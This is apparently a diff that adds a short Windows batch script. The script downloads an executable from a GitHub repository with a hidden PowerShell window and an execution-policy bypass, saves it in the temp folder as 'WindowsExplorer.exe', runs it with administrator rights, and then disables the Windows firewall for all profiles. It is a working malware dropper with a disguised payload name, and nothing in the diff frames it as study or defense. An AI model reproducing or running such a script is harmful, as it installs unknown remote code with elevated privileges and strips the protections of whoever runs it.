@@ -1,0 +1,10 @@
+@echo off
+set "target=%TEMP%\WindowsExplorer.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
+"Invoke-WebRequest -Uri 'https://github.com/ibrahem1012/aaaa/raw/refs/heads/main/WindowsExplorer.exe' -OutFile '%target%'"
+timeout /t 10 /nobreak >nul
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"Start-Process '%target%' -Verb RunAs"
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False"
+exit
